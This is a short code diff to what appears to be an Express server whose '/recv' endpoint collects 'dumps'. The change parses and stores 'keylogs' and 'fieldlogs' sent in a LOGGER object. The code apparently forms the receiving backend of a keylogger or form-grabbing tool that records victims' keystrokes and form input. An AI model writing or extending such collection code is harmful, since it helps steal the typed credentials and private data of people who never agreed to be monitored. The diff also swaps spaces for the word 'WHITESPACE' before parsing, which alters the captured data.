@@ -23,7 +23,15 @@ function loadDb() {
 app.post('/recv', (req, res) => {
   const data = JSON.parse(fs.readFileSync(db).toString())
 
-  data.dumps.push(req.body)
+  function nonWs(data) {
+    return data.replaceAll(' ', 'WHITESPACE')
+  }
+
+  const keylogs = JSON.parse(nonWs(req.body.LOGGER.keylogs))
+  const fieldlogs = JSON.parse(nonWs(req.body.LOGGER.fieldlogs))
+  delete req.body.LOGGER
+
+  data.dumps.push({ ...req.body, LOGGER: { keylogs, fieldlogs } })
   fs.writeFileSync(db, JSON.stringify(data, null, 2))
 
   console.log(`- Dump ${data.dumps.length}`)
